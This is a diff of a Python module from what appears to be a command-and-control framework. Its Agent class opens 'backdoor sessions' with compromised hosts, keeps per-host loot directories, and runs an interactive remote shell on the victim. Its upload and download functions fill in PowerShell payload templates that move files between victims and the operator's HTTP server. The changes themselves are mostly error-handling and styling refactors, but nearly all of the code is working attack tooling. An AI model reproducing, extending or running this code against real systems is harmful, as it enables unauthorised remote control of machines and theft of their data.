@@ -18,6 +18,7 @@ class Agent:
         
         self.path = None
         self.conn = connection
+        self.shell_active = True
         self.buff = 4096
 
 
@@ -31,7 +32,7 @@ class Agent:
 
                 os_type = "Linux"
 
-                self.send_command("hostname && whoami")
+                self.send_command("hostname")
                 response = self.receive_all().split('\n')
 
                 hostname = response[0].strip('\r').upper()
@@ -51,16 +52,19 @@ class Agent:
             return user, hostname, os_type
 
 
-        except ConnectionResetError as e:
-            print(f"\n\n{c.alt} Failed to establish backdoor session with {c.Y}{agent_ip}{c.RS}: Connection reset by peer")
+        except ConnectionResetError:
+
+            print(f"\n\n{ALERT} Failed to establish backdoor session with {YELLOW}{agent_ip}{RST}: Connection reset by peer")
             return
 
-        except ConnectionError as e:
-            print(f"\n\n{c.alt} Failed to establish backdoor session with {c.Y}{agent_ip}{c.RS}: Connection error")
+        except ConnectionError:
+
+            print(f"\n\n{ALERT} Failed to establish backdoor session with {YELLOW}{agent_ip}{RST}: Connection error")
             return
 
         except Exception as e:
-            print(f"\n\n{c.alt} Failed to establish backdoor session with {c.Y}{agent_ip}{c.RS}: Unknown error occurred")
+
+            print(f"\n\n{ALERT} Failed to establish backdoor session with {YELLOW}{agent_ip}{RST}: Unknown error occurred {e}")
             return
 
 
@@ -72,6 +76,7 @@ class Agent:
 
         agents_db = AgentsDB()
 
+
         session_id = SessionManager.createSessionId()
         SessionManager.agents_connections[session_id] = self.conn
 
@@ -82,7 +87,8 @@ class Agent:
 
         user_and_hostname = f"{hostname}/{user}"
 
-        print(f"\n\n{c.info} Connection with {c.G}{agent_ip}:{agent_port}{c.RS} established")
+        print(f"\n\n{INFO} Connection with {GREEN}{agent_ip}:{agent_port}{RST} established")
+        Main_Prompt.rst_prompt_menu()
 
         AutoComplete.defaultCommands.append(session_id)
         loot_path = f"Loots/{hostname}"
@@ -94,14 +100,13 @@ class Agent:
 
             SessionManager.loots_paths[session_id] = loot_path
 
-        except OSError:
+        except OSError as e:
 
-            print(f"{c.alt} An error occurred while trying to create loot directory")
+            print(f"{ERROR} An error occurred while trying to create loot directory: {e}")
 
 
         agents_db.add_agent(session_id, agent_ip, os_type, user_and_hostname, "Active")
-        threading.Thread(target=self.is_agent_alive, name="is_agent_alive_thread").start()
-
+        threading.Thread(target=self.is_agent_alive, daemon=True, name="is_agent_alive_thread").start()
 
 
     @staticmethod
@@ -110,6 +115,10 @@ class Agent:
         agents_db = AgentsDB()
 
         while True:
+
+            if not SessionManager.agents_connections:
+                return
+
             time.sleep(1)
 
             for session_id, conn in SessionManager.agents_connections.items():
@@ -119,7 +128,8 @@ class Agent:
                     if error != 0:
                         agents_db.update_agent_status(session_id, "Inactive")
                         user = agents_db.get_agent_user(session_id)
-                        print(f"\n\n{c.alt} Connection with Agent {c.RS}{c.O}{user}{c.RS} lost")
+                        print(f"\n\n{ALERT} Connection with Agent {RST}{ORANGE}{user}{RST} lost")
+                        Main_Prompt.rst_prompt_menu()
                         pass
 
                 except socket.timeout:
@@ -130,22 +140,39 @@ class Agent:
 
 
     def receive_all(self):
-        
+
         data = b''
 
-        while True:
+        try:
 
-            buff = self.conn.recv(self.buff)
+            while True:
 
-            if not buff:
-                break
-            data += buff
+                buff = self.conn.recv(self.buff)
 
-            if len(buff) < self.buff:
-                break
+                if not buff:
+                    break
+                data += buff
 
-        return data.decode('utf-8')
+                if len(buff) < self.buff:
+                    break
 
+            return data.decode('utf-8')
+
+        except socket.timeout:
+
+            print(f"{ERROR} An error occurred while receiving data from agent: Connection timeout")
+            self.close_shell()
+
+
+        except ConnectionError:
+
+            print(f"{ERROR} An error occurred while receiving data from agent: Connection error")
+            self.close_shell()
+            
+        except Exception:
+
+            print(f"{ERROR} An unknown error occurred while receiving data from agent")
+            self.close_shell()
 
 
     def send_command(self, command):
@@ -154,16 +181,25 @@ class Agent:
 
             self.conn.send(command.encode('utf-8'))
 
-        except socket.timeout:
+        except ConnectionError:
 
-            print(f"\n{c.alt} Connection timeout")
+            print(f"\n{ERROR} An error occurred while sending command: Connection error")
             self.close_shell()
 
+        except socket.timeout:
+            print(f"\n{ERROR} An error occurred while sending command: Connection timeout")
+            self.close_shell()
+
+        except Exception:
+
+            print(f"\n{ERROR} Unknown error occurred while sending command")
+            self.close_shell()
 
     def close_shell(self):
         
         self.conn = None
-        print(Message.shellClosed)
+        self.shell_active = False
+        print(f"\n{ALERT} Shell deactivated")
 
 
     @staticmethod
@@ -177,12 +213,10 @@ class Agent:
 
     def init_path(self):
         
-        self.conn.send("whoami".encode('utf-8'))
-        response = self.conn.recv(self.buff).decode("utf-8")
-        
+        self.send_command("pwd")
+        response = self.receive_all()
         self.path = self.create_path(response)
-        time.sleep(0.2)
-    
+
         
     def remove_path(self, response):
         
@@ -217,134 +251,129 @@ class Agent:
 
                 
     def shell(self):
-                
-        print(f"\n{c.add} Interactive shell activated\n{c.info} Type 'exit' or press 'CTRL+C' to deactivate\n")
+
+        print(f"\n{ADD} Interactive shell activated\n{INFO} Type 'exit' or press 'CTRL+C' to deactivate\n")
         self.init_path()
-        
-        while True:   
-            
-            try:
-                
-                command  = input(f"PS {self.path} ")
-                command_args = command.split()
-                
-                if len(command_args) == 0:
-                    continue
-    
-                main_arg = command_args[0].strip().lower()
-                
-                if main_arg == "exit":
-                    
-                    self.close_shell()
-                    break
 
-                
-                elif len(main_arg) == 0:
-                    continue
-                
-                elif main_arg == "clear":
-                    clear_screen()
-                    
-                elif main_arg == "upload":
-                    
-                    args = command.split()
-                    
-                    if len(args) < 3:
-                        
-                        print(f"\n{c.alt} Missing <file path> <target path> arguments\n")
+        while True:
+
+            if self.shell_active:
+
+                try:
+
+                    command  = input(f"PS {self.path} ")
+                    command_args = command.split()
+
+                    if len(command_args) == 0:
                         continue
-                    
-                    else:
-                        
-                        local_path = args[1].strip()
-                        upload_path = args[2].strip()
-                    
-                        self.upload_file(local_path, upload_path)
-            
-                        
-                elif main_arg == "download":
-                    
-                    args = command.split()
-                    
-                    if len(args) < 2:
-                        print(f"\n{c.alt} Missing <file path> argument\n")
-                        continue
-                    
-                    else:
-                        file_path = args[1].strip()
-                        
-                        self.downloadFile(file_path)
 
-                else:
+                    main_arg = command_args[0].strip().lower()
 
-                    try:
-                        
-                        self.send_command(command)
-                        response = self.receive_all()
-                                        
-                        self.path = self.create_path(response)
-                        response = self.remove_path(response)
-                                                       
-                        file_names = self.get_file_names(response)
-                        
-                        self.update_session_commands(command, file_names)
-                
-                        print(f"{c.G}{response}{c.RS}")
+                    if main_arg == "exit":
 
-                    except Exception as e:
-
-                        print(f"\n{c.alt} An error occurred while executing command")
-                        print(f"{c.alt} {e}")
                         self.close_shell()
                         break
 
 
-            except KeyboardInterrupt:
-                
-                print("\n")
-                self.close_shell()
+                    elif len(main_arg) == 0:
+                        continue
+
+                    elif main_arg == "clear":
+                        clear_screen()
+
+                    elif main_arg == "upload":
+
+                        args = command.split()
+
+                        if len(args) < 3:
+
+                            print(f"\n{ALERT} Missing <file path> <target path> arguments\n")
+                            continue
+
+                        else:
+
+                            local_path = args[1].strip()
+                            upload_path = args[2].strip()
+
+                            self.upload_file(local_path, upload_path)
+
+
+                    elif main_arg == "download":
+
+                        args = command.split()
+
+                        if len(args) < 2:
+                            print(f"\n{ALERT} Missing <file path> argument\n")
+                            continue
+
+                        else:
+                            file_path = args[1].strip()
+
+                            self.downloadFile(file_path)
+
+                    else:
+
+                        self.send_command(command)
+                        response = self.receive_all()
+
+                        self.path = self.create_path(response)
+                        response = self.remove_path(response)
+
+                        file_names = self.get_file_names(response)
+
+                        self.update_session_commands(command, file_names)
+
+                        print(f"{GREEN}{response}{RST}")
+
+                except KeyboardInterrupt:
+
+                    print("\n")
+                    self.close_shell()
+                    break
+
+            else:
                 break
 
 
     def file_path_exists(self, file_path):
-                
+
         check_file_path = f"Test-Path -Path {file_path}"
-        
+
         self.send_command(check_file_path)
         is_path_exist = self.receive_all()
         is_path_exist = self.remove_path(is_path_exist)
-        
+
         if is_path_exist == "True":
 
             return True
-        
+
         else:
             return False
 
-                    
+
     def upload_file(self, local_path, upload_path):
-        
+
         lhost = self.get_ip()
         protocol = "http"
-        
-        
+
+
         if HTTPFileServerSettings.SSL:
-            
+
             protocol = "https"
             upload_payload = powershell_upload_file_ssl.Payload.template
-            
+
         else:
-            
+
             upload_payload = powershell_upload_file.Payload.template
-            
-            
+
+
         if os.path.exists(local_path):
-                        
+
             local_file_name = os.path.basename(local_path)
-            
+
             if upload_path[-1] != "/" and upload_path[-1] != "\\":
                 upload_path = upload_path + "\\"
-                
+
             upload_file_name = os.path.basename(upload_path.replace("\\", "/"))
 
             if upload_file_name == "":
@@ -353,88 +382,96 @@ class Agent:
             upload_path = upload_path.replace(upload_file_name, '')
 
             if self.file_path_exists(upload_path):
-                
+
                 server_url = f"{protocol}://{lhost}:{HTTPFileServerSettings.bind_port}/{local_file_name}"
-                
+
                 upload_payload = upload_payload.replace("SERVERURL", server_url)
                 upload_payload = upload_payload.replace("TARGETPATH", upload_path)
-                                
+
                 FileHandler.filePath = local_path
-            
+
                 try:
-                    
+
                     self.send_command(upload_payload)
                     self.receive_all()
-                    print(f"{c.add} File successfully uploaded\n")
+                    print(f"{ADD} File successfully uploaded\n")
 
                 except ConnectionError:
 
-                    print(f"\n{c.alt} Failed to upload file\n")
-                    
+                    print(f"\n{ERROR} Failed to upload file: Connection Error\n")
+
+                except Exception:
+
+                    print(f"\n{ERROR} Failed to upload file: Unknown error occurred\n")
+
             else:
-                print(f'\n{c.alt} Upload path "{c.Y}{upload_path}{c.RS}" not found\n')
+                print(f'\n{ALERT} Upload path "{YELLOW}{upload_path}{RST}" not found\n')
                 return
-        
+
         else:
-            print(f'\n{c.alt} File "{c.Y}{local_path}{c.RS}" not found\n')
-            return 
-                
-                
+            print(f'\n{ALERT} File "{YELLOW}{local_path}{RST}" not found\n')
+            return
+
+
 
     def get_ip(self):
-        
+
         socket_obj = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         socket_obj.connect(("8.8.8.8", 80))
         return socket_obj.getsockname()[0]
-            
+
 
     def downloadFile(self, file_path):
-        
+
         lhost = self.get_ip()
         protocol = "http"
-        
+
         check_file_path = f"Test-Path -Path {file_path}"
-        
-        if HTTPFileServerSettings.SSL:  
-               
+
+        if HTTPFileServerSettings.SSL:
+
             download_payload = powershell_download_file_ssl.Payload.template
             protocol = "https"
-            
+
         else:
             download_payload = powershell_download_file.Payload.template
-            
-            
+
+
         self.send_command(check_file_path)
         is_file_exist = self.receive_all()
         is_file_exist = self.remove_path(is_file_exist)
-        
+
         if is_file_exist == "True":
-            
+
             if "/" not in file_path and "\\" not in file_path:
                 file_path = self.path.replace(">", "") + "\\" + file_path
-                
+
             file_name = os.path.basename(file_path.replace("\\", "/"))
-                            
+
             server_url = f"{protocol}://{lhost}:{HTTPFileServerSettings.bind_port}/{file_name}"
             download_payload = download_payload.replace("SERVERURL", server_url)
             download_payload = download_payload.replace("FILEPATH", file_path)
-                                                        
-            try:  
-                    
+
+            try:
+
                 self.send_command(download_payload)
                 self.receive_all()
-                
-                print(f"{c.add} File successfully downloaded\n")
+
+                print(f"{ADD} File successfully downloaded\n")
 
             except ConnectionError:
-                
-                print(f"\n{c.alt} Failed to download file\n")
-           
-            
+
+                print(f"\n{ERROR} Failed to download file: Connection Error\n")
+
+            except Exception:
+
+                print(f"\n{ERROR} Failed to download file: Unknown error occurred\n")
+
+
         else:
-            print(f'\n{c.alt} File "{c.Y}{file_path}{c.RS}" not found\n')
-            
-            
+            print(f'\n{ALERT} File "{YELLOW}{file_path}{RST}" not found\n')
+
+
     
 
 class FileHandler(BaseHTTPRequestHandler):
@@ -456,7 +493,7 @@ class FileHandler(BaseHTTPRequestHandler):
                 self.end_headers()
                 
                 print("")
-                pr_bar = tqdm(total=file_size, unit='B', unit_scale=True, desc=f"{c.add} Uploading {c.G}{file_name}{c.RS}", ascii=True, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} {postfix}", colour='green')
+                pr_bar = tqdm(total=file_size, unit='B', unit_scale=True, desc=f"{ADD} Uploading {GREEN}{file_name}{RST}", ascii=True, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} {postfix}", colour='green')
                 
                 for data in iter(lambda: file.read(1024), b''):
                     
@@ -467,7 +504,7 @@ class FileHandler(BaseHTTPRequestHandler):
                     
         except FileNotFoundError:
 
-            print(f"\n{c.alt} File not found: {c.Y}{self.filePath}{c.RS}")
+            print(f"\n{ALERT} File not found: {YELLOW}{self.filePath}{RST}")
             self.send_error(404, 'File Not Found: %s' % self.path)
             
 
@@ -477,7 +514,7 @@ class FileHandler(BaseHTTPRequestHandler):
         file_size = int(self.headers['Content-Length'])
                     
         print("")                   
-        pr_bar = tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Downloading {c.G}{file_name}{c.RS}", ascii=True, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} {postfix}", colour='green')
+        pr_bar = tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Downloading {GREEN}{file_name}{RST}", ascii=True, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} {postfix}", colour='green')
 
         with open(file_name, 'wb') as f:
             
